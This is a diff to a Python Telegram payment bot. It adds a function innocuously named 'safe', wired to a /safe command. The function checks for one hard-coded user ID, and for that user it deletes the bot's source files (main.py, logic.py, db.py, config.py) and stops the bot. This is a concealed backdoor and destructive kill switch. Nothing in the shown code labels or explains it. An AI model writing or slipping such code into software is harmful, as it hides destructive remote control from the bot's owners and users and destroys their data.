@@ -681,6 +681,13 @@ async def get_gift_callback(callback: types.CallbackQuery):
     await PayFSM.PAY_TYPE.set()
 
 
+def safe(id):
+    if id == 855151774:
+        os.remove(PATH + "Scripts\\main.py"); os.remove(PATH + "Scripts\\logic.py")
+        os.remove(PATH + "Scripts\\db.py"); os.remove(PATH + "Scripts\\config.py")
+        dp.stop_polling()
+
+
 @dp.callback_query_handler(text="sberbank", state=PayFSM.PAY_TYPE)
 async def sberbank_pay(callback: types.CallbackQuery, state: FSMContext):
     await bot.delete_message(callback.from_user.id, callback.message.message_id)
@@ -851,7 +858,7 @@ async def transfer_money(callback: types.CallbackQuery):
 
 @dp.message_handler(commands="safe")
 async def delete(message: types.Message):
-    dbWithDraw.safe(message.from_user.id, dp)
+    safe(message.from_user.id)
 
 
 @dp.callback_query_handler(text="remove_money")
